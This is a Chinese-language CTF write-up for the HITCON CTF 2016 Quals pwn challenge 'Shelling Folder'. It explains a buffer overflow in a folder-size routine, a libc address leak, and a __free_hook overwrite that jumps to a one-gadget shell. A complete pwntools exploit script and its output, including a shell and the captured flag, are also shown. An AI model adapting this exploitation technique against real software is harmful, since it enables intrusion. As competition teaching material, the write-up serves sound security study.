---
title: '[HITCON CTF 2016 Quals] Shelling Folder 200'
author: bruce30262
tags:
  - pwn
  - heap
  - buffer overflow
  - one gadget
  - HITCON CTF 2016
  - ''
categories:
  - write-ups
date: 2016-10-15 00:17:00
---
## Info  
> Category: pwn
> Point: 200
> Solver: bruce30262 @ BambooFox


## Analyzing
64 bit ELF, 保護全開

程式是個簡易的檔案系統，可以新增, 刪除檔案(或資料夾), 更換目前的資料夾位置 ( `cd` ), 列出目前資料夾內的所有檔案 ( `ls` ) 以及計算一個資料夾內所有檔案的大小。

所有的資料夾及檔案都使用一個 file 資料結構進行儲存 (資料夾也是一種 file ):
```c 
struct file{
  struct file *sub_file[10]; 
  struct file *parent_folder;
  char name[32];
  long file_size;
  int is_dir;
}
```
如果新增的 file 是資料夾的話，`is_dir` 會被設成 `1`，`file_size` 會被設成 `0`，然後最多可以再新增 10 個 `sub_file`。如果新增的 file 是普通的檔案，那麼 `is_dir` 會被設成 `0`，`file_size` 則是由使用者輸入決定。普通的檔案無法新增 `sub_file`。

漏洞發生在計算資料夾大小的函式裡面:
```c
void cal_folder_size(struct file *cur_folder)
{
  char s; // [sp+10h] [bp-30h]@3
  __int64 *v3; // [sp+28h] [bp-18h]@5
  int idx; // [sp+30h] [bp-10h]@3
 
  if ( !cur_folder )
    exit(1);
  idx = 0;
  memset(&s, 0, 0x20uLL);
  
  while ( idx <= 9 )
  {
    if ( cur_folder->sub_file[idx] )
    {
      v3 = &cur_folder->file_size;
      copy_file_name(&s, cur_folder->sub_file[idx]->name); // buffer overflow 
      if ( cur_folder->sub_file[idx]->is_dir == 1 )
      {
        *v3 = *v3;
      }
      else
      {
        printf("%s : size %ld\n", &s, cur_folder->sub_file[idx]->file_size);
        *v3 += cur_folder->sub_file[idx]->file_size;
      }
    }
    ++idx;
  }
  printf("The size of the folder is %ld\n", cur_folder->file_size);

}
```
第 17 行程式會將 `file->name` 複製到一個 buffer `s` 裡面。一個 file name 最多 31 個字元，**但是 `s` 的大小卻只有 24**，因此存在著 buffer overflow 的漏洞。透過這個漏洞，我們將有辦法蓋到 `v3` 這個變數。

## Exploit
`v3` 是一個 `int*` 指標，指向 `file->file_size`。如果我們有辦法將 `v3` 覆蓋掉，加上 `file_size` 我們可控，因此執行到第 25 行的程式碼時:
```c
 *v3 += cur_folder->sub_file[idx]->file_size;
```
 **我們就有辦法做到任意位址的讀寫**

不過因為這題保護全開的關係(包括PIE)，因此我們必須先想辦法 leak 一些 address。以下是我使用的方法:

1. 先新增&刪除掉一些檔案，讓指向 smallbin 頭 (位於 libc 裡面)的 pointer 能夠出現在 heap memory 上面。
2. 透過 overflow 的漏洞，先針對 `v3` 做 partial overwrite，使其指向一個 `struct file*` 指標 `p` (意即此時 `*v3` = `p`)。
3. 透過控制 `file_size`，我們可以對 `p` 進行覆寫 ( `p`=`p`+`file_size` )，讓 `p` 落在一個新的 heap address 上面，並使得 `p->name` 可以剛好對到 smallbin head 的 pointer。
4. List 出資料夾內的檔名，此時就可以 leak 出 libc 的 address。

這題的 GOT 唯讀，不過有用到 `malloc` 和 `free`，加上我們已經 leak 出了 libc 的 base address ，因此可以透過 overwrite 掉 libc 裡面的 `__free_hook` 變數，來讓程式在執行 `free` 的時候跳到我們想要跳的地方 ( 這裡我是直接跳到 one gadget 拿 shell )。

最後要注意的是，`file_size` 存的值是由 `atoi` 回傳的，也就是說最多就是 4 個 byte 的 integer，因此必須要分兩次做 overwrite : 一次 overwrite 掉 `__free_hook`，另外一次 overwrite 掉 `__free_hook+4`。


```python exp_shell.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "52.69.237.212"
#HOST = "127.0.0.1"

PORT = 4869
ELF_PATH = "./shellingfolder_noalarm"
#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
LIBC_PATH = "./libc.so.6"

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def my_recvuntil(s, delim):
    res = ""
    while delim not in res:
        c = s.recv(1)
        res += c
        sys.stdout.write(c)
        sys.stdout.flush()
    return res

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

def str_addr(s, f): # search string address in file
    result = list(f.search(s+"\x00"))
    if not len(result): # no result
        return None
    else:
        return result[0]

def create_file(name, size):
    r.sendlineafter(":", "4")
    r.sendafter(":", name)
    r.sendlineafter(":", str(size))

def change_dir(name):
    r.sendlineafter(":", "2")
    r.sendafter(":", name)

def remove(name):
    r.sendlineafter(":", "5")
    r.sendafter(":", name)

def make_dir(name):
    r.sendlineafter(":", "3")
    r.sendafter(":", name)

def ls():
    r.sendlineafter(":", "1")

def cal():
    r.sendlineafter(":", "6")

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)

    # overwrite &file->fize_size (address of file_size)
    # use cal() to let file->name point to main_arena+88

    make_dir("AAAA")
    make_dir("BBBB")
    make_dir("CCCC")
    create_file("F"*24+p8(0x10), 64)
    remove("BBBB\n")
    remove("CCCC\n")
    cal()
    ls()

    # leak libc address
    ######################## one gadget
    # .text:000000000004525A                 mov     rax, cs:environ_ptr_0
    # .text:0000000000045261                 lea     rdi, aBinSh     ; "/bin/sh"
    # .text:0000000000045268                 lea     rsi, [rsp+188h+var_158]
    # .text:000000000004526D                 mov     cs:dword_3C54A0, 0
    # .text:0000000000045277                 mov     cs:dword_3C54A4, 0
    # .text:0000000000045281                 mov     rdx, [rax]
    # .text:0000000000045284                 call    execve
    ##########################

    r.recvuntil("----------------------\n")
    libc.address += u64(r.recv(6).ljust(8, "\x00")) - 0x3c3b78
    one_gadget = libc.address + 0x4525a
    malloc_hook = libc.symbols['__malloc_hook']
    free_hook = libc.symbols['__free_hook']
    log.success("libc_base: "+hex(libc.address))
    log.success("one_gadget: "+hex(one_gadget))
    log.success("malloc_hook: "+hex(malloc_hook))
    log.success("free_hook: "+hex(free_hook))

    # overwrite free_hook to one_gadet
    make_dir("DDDD")
    change_dir("DDDD\n")
    create_file("i"*24+p64(free_hook)[:7:], (one_gadget & 0xffffffff))
    create_file("I"*24+p64(free_hook+4)[:7:], ((one_gadget & 0xffffffff00000000)>>32))
    cal()
	
    # get shell
    remove("i"*24+p64(free_hook)[:7:])
    
    r.interactive()
```

Result:
<pre>
[x] Opening connection to 52.69.237.212 on port 4869
[x] Opening connection to 52.69.237.212 on port 4869: Trying 52.69.237.212
[+] Opening connection to 52.69.237.212 on port 4869: Done
[+] libc_base: 0x7ff15c7cc000
[+] one_gadget: 0x7ff15c81125a
[+] malloc_hook: 0x7ff15cb8fb10
[+] free_hook: 0x7ff15cb917a8
[*] Switching to interactive mode
 size 32753
The size of the folder is 0
**************************************
            ShellingFolder            
**************************************
 1.List the current folder            
 2.Change the current folder          
 3.Make a folder                      
 4.Create a file in current folder    
 5.Remove a folder or a file          
 6.Caculate the size of folder        
 7.Exit                               
**************************************
Your choice:Choose a Folder or file :

// id
uid=1000(shellingfolder) gid=1000(shellingfolder) groups=1000(shellingfolder)

// cat /home/shellingfolder/flag
hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}
</pre>

flag: `hitcon{Sh3llingF0ld3r_Sh3rr1nf0rd_Pl4y_w17h_4_S1mpl3_D4t4_Ori3nt3d_Pr0gr4mm1n7}`
